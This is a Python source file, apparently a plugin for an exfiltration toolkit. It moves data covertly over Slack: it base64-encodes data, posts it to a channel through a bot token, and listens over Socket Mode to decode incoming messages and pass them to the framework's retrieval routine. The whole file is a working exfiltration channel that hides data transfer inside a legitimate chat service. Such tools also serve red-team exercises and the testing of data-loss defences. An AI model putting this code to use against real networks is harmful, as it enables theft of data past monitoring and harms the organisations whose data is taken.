import base64
from slack_sdk.web import WebClient
from slack_sdk.socket_mode import SocketModeClient
from slack_sdk.socket_mode.response import SocketModeResponse
from slack_sdk.socket_mode.request import SocketModeRequest
from slack_sdk.errors import SlackApiError
import time
from threading import Event

app_exfiltrate = None
config = None
sc = None


def send(data):
    global sc
    chan = config['chan_id']
    app_exfiltrate.log_message('info', "[slack] Sending {} bytes with Slack".format(len(data)))
    data = base64.b64encode(data.encode()).decode()

    try:
        sc.chat_postMessage(channel=chan, text=data, as_user=True)
    except SlackApiError as e:
        print(e.response['error'])

def process(client, req):
    if req.type == "events_api":
        # Acknowledge the request anyway
        response = SocketModeResponse(envelope_id=req.envelope_id)
        client.send_socket_mode_response(response)

        # Add a reaction to the message if it's a new message
        if "text" in req.payload["event"] and req.payload["event"]["type"] == "message" and "subtype" not in req.payload["event"]:
            try:
                data = base64.b64decode(req.payload["event"]["text"]).decode()
                app_exfiltrate.log_message('info', "[slack] Receiving {} bytes with Slack".format(len(data)))
                app_exfiltrate.retrieve_data(data)
            except Exception as e:
                # print(e)
                pass

def listen():
    global config, sc
    try:
        client = SocketModeClient(
                # This app-level token will be used only for establishing a connection
                app_token=config['app_token'],  # xapp-A111-222-xyz
                # You will be using this WebClient for performing Web API calls in listeners
                web_client=sc
            )
        client.socket_mode_request_listeners.append(process)
        client.connect()
        app_exfiltrate.log_message('info', "[slack] Listening for messages")
        Event().wait()
    except Exception as e:
        print(e)

def proxy():
    app_exfiltrate.log_message('info', "[proxy] [slack] proxy mode unavailable (useless) for Slack plugin")

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config, sc
        sc=WebClient(token=conf['bot_token'])  # xoxb-111-222-xyz
        config = conf
        app.register_plugin('slack', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
